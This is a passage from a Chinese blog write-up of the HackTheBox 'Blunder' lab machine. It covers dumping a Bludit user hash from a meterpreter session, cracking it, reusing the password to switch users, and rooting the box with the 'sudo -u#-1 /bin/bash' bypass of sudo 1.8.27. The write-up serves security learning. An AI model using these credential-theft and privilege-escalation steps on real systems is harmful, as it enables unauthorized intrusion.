<p>该文件中可能存有用户的信息，但是查看后仅有<code>admin</code>用户和<code>fergus</code>用户。但在/var/www/bludit-3.10.0a/bl-content/databases下的<code>users.php</code>文件中，保存的用户是<code>Hugo</code>！</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; pwd</span><br><span class="line">/<span class="keyword">var</span>/www/bludit<span class="number">-3.10</span><span class="number">.0</span>a/bl-content/databases</span><br><span class="line">meterpreter &gt; cat users.php</span><br><span class="line"><span class="meta">&lt;?php</span> defined(<span class="string">'BLUDIT'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">'Bludit CMS.'</span>); <span class="meta">?&gt;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">"admin"</span>: &#123;</span><br><span class="line">        <span class="string">"nickname"</span>: <span class="string">"Hugo"</span>,</span><br><span class="line">        <span class="string">"firstName"</span>: <span class="string">"Hugo"</span>,</span><br><span class="line">        <span class="string">"lastName"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"role"</span>: <span class="string">"User"</span>,</span><br><span class="line">        <span class="string">"password"</span>: <span class="string">"faca404fd5c0a31cf1897b823c695c85cffeb98d"</span>,</span><br><span class="line">        <span class="string">"email"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"registered"</span>: <span class="string">"2019-11-27 07:40:55"</span>,</span><br><span class="line">        <span class="string">"tokenRemember"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"tokenAuth"</span>: <span class="string">"b380cb62057e9da47afce66b4615107d"</span>,</span><br><span class="line">        <span class="string">"tokenAuthTTL"</span>: <span class="string">"2009-03-15 14:00"</span>,</span><br><span class="line">        <span class="string">"twitter"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"facebook"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"instagram"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"codepen"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"linkedin"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"github"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="string">"gitlab"</span>: <span class="string">""</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中密码是经过加密的，根据hash-identifier判断是SHA-1加密的。</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@vultr:~# hash-identifier </span><br><span class="line"><span class="meta">   #</span><span class="bash"><span class="comment">########################################################################</span></span></span><br><span class="line"><span class="meta">   #</span><span class="bash">     __  __                     __           ______    _____           <span class="comment">#</span></span></span><br><span class="line"><span class="meta">   #</span><span class="bash">    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         <span class="comment">#</span></span></span><br><span class="line"><span class="meta">   #</span><span class="bash">    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        <span class="comment">#</span></span></span><br><span class="line"><span class="meta">   #</span><span class="bash">     \ \  _  \  /<span class="string">'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #</span></span></span><br><span class="line"><span class="meta">   #</span><span class="bash">      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      <span class="comment">#</span></span></span><br><span class="line"><span class="meta">   #</span><span class="bash">       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      <span class="comment">#</span></span></span><br><span class="line"><span class="meta">   #</span><span class="bash">        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 <span class="comment">#</span></span></span><br><span class="line"><span class="meta">   #</span><span class="bash">                                                             By Zion3R <span class="comment">#</span></span></span><br><span class="line"><span class="meta">   #</span><span class="bash">                                                    www.Blackploit.com <span class="comment">#</span></span></span><br><span class="line"><span class="meta">   #</span><span class="bash">                                                   Root@Blackploit.com <span class="comment">#</span></span></span><br><span class="line"><span class="meta">   #</span><span class="bash"><span class="comment">########################################################################</span></span></span><br><span class="line">--------------------------------------------------</span><br><span class="line"> HASH: faca404fd5c0a31cf1897b823c695c85cffeb98d</span><br><span class="line"></span><br><span class="line">Possible Hashs:</span><br><span class="line">[+] SHA-1</span><br><span class="line">[+] MySQL5 - SHA-1(SHA-1($pass))</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/17.png" alt="17"></p>
<p>解密得到密码<code>Password120</code>。</p>
<p>这是Hugo登录bludit的密码，但是密码重用的情况十分普遍，这也可能是hugo登录服务器的密码，su到用户hugo：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; su hugo</span><br><span class="line">[-] Unknown command: su.</span><br><span class="line">meterpreter &gt; whoami</span><br><span class="line">[-] Unknown command: whoami.</span><br></pre></td></tr></table></figure>

<p>当前的shell交互性很差：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 5710 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">whoami</span><br><span class="line">www-data</span><br><span class="line">su hugo</span><br><span class="line">Password: Password120</span><br><span class="line">whoami</span><br><span class="line">hugo</span><br></pre></td></tr></table></figure>

<p>当前的shell交互性比较差，利用python的pty模块将简单的shell转换为完全交互式的标准shell：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c "import pty;pty.spawn('/bin/bash');"</span><br></pre></td></tr></table></figure>

<p>然后进入<code>/home/hugo/</code>目录下即可读取<code>user.txt</code>文件。</p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>首先查看当前系统的内核版本：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hugo@blunder:~$ uname -r</span><br><span class="line">uname -r</span><br><span class="line">5.3.0-53-generic</span><br></pre></td></tr></table></figure>

<p>搜索之后并没有发现什么可以利用的内核漏洞，还可以从sudo命令入手：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">hugo@blunder:~$ sudo -l </span><br><span class="line">sudo -l</span><br><span class="line">Password: Password120</span><br><span class="line"></span><br><span class="line">Matching Defaults entries for hugo on blunder:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User hugo may run the following commands on blunder:</span><br><span class="line">    (ALL, !root) /bin/bash</span><br></pre></td></tr></table></figure>

<p><code>(ALL, !root) /bin/bash</code>表示hugo用户可以以任何用户（除root外）的身份执行<code>/bin/bash</code>。搜索该关键字发现了在sudo 1.8.27版本中漏洞存在一个高危提权漏洞：</p>
<p><img src="/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/imgs/18.png" alt="18"></p>
<p>直接利用即可获取root权限：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hugo@blunder:~$ sudo -u#-1 /bin/bash</span><br><span class="line">sudo -u#-1 /bin/bash</span><br><span class="line">root@blunder:/home/hugo# id</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=1001(hugo) groups=1001(hugo)</span><br></pre></td></tr></table></figure>


        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Bantian</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://bantttian.github.io/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/">https://bantttian.github.io/2020/12/12/HackTheBox-Blunder%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>早睡早起身体好</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/HackTheBox/"># HackTheBox</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2020/12/20/HackTheBox-Kryptos%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/">HackTheBox-Kryptos靶机渗透笔记</a>
            
            
            <a class="next" rel="next" href="/2020/08/24/%5BNDSS18%5DSYNODE-nodejs/">NDSS2018 & Synode-Understanding and Automatically Preventing Injection Attacks on Node.js</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
